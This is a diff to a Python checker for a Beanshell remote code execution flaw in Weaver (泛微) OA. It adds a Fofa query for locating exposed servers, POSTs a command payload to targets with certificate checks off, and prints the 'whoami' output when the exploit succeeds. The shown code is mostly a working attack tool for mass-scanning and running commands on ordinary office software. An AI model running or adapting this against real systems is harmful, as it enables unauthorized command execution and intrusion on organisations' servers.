@@ -1,3 +1,7 @@
+# -*- coding: utf-8 -*-
+# 泛微OA Beanshell RCE漏洞
+# Fofa:  app="泛微-协同办公OA"
+
 import requests
 import sys
 import time
@@ -43,14 +47,18 @@ def Check(target):
     try:
         requests.packages.urllib3.disable_warnings()
         request = requests.post(headers=headers, url=target, data=payload, timeout=5, verify=False)
-        if ";</script>" not in (request.text):
-            if "Login.jsp" not in (request.text):
-                if "Error" not in (request.text):
-                    print(now_time() + info() + '存在Beanshell RCE漏洞: {}'.format(target))
-                    print(now_time()+info()+'可Post手动传值测试: {}'.format(payload))
-                    print(now_time() + success() + 'whoami: {}'.format(request.text.strip('\n')))
-        return 'ok'
+        if ";</script>" not in request.text:
+            if "Login.jsp" not in request.text:
+                if "Error" not in request.text:
+                    if "<head>" not in request.text:
+                        print(now_time() + info() + '存在Beanshell RCE漏洞: {}'.format(target))
+                        print(now_time()+info()+'可Post手动传值测试: {}'.format(payload))
+                        print(now_time() + success() + 'whoami: {}'.format(request.text.strip('\n')))
+                        return 'ok'
+                    else:
+                        print(now_time()+warning()+"不存在Beanshell RCE漏洞")
     except:
+
         print(now_time() + error() + '未知错误')
 
 
